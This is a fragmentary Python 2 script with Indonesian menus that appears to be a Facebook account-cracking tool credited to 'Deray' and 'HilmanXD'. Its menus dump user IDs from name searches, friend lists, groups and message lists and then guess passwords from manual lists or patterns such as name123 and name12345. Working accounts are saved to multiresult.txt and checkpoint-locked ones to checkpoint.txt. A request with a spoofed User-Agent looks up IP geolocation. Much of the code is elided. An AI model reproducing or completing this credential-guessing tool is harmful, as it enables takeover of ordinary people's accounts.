...
try:
	...
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749"}).json()["country_name"].lower()
except:
	ips=None
...
class crack:
	def __init__(self,show=True):
		...
		if show==True:
			print("\n\t[ PILIH MENU ]\n")
			print("  1. Crack Pakai Password Manual Lists.")
			print("  2. Crack Otomatis (name123,name1234,name12345)\n")
		while True:
			f=raw_input("? Menu Pilihan: ")
			if f=="":continue
			elif f=="1":
				try:
					while True:
				...
				try:
					...
					continue
				print "!: crack Mulai..."
				print "+: Akun OK Akan Di Save: multiresult.txt"
				print "+: Akun CP Akan Di Save: checkpoint.txt"
...
\033[0;92mAuthor : Deray\033[0;39m\n
\033[0;92mReedit : HilmanXD\033[0;39m\n
——————————————————————————————————

\033[0;92m __       __   ______   __    __ 
\033[0;92m/  \     /  | /      \ /  \  /  |
\033[0;92m$$  \   /$$ |/$$$$$$  |$$  \ $$ |
\033[0;92m$$$  \ /$$$ |$$ |__$$ |$$$  \$$ |
\033[0;92m$$$$  /$$$$ |$$    $$ |$$$$  $$ |
...
while True:
	print "  [1] Dump ID Dari Pencarian Nama"
	print "  [2] Dump ID Dari Publik Friendlist"
	print "  [3] Dump ID Dari Group"
	print "  [4] Dump Id Dari Pesan List"
	print "  [5] Crack"
	print "  [6] Hapus account.\n"
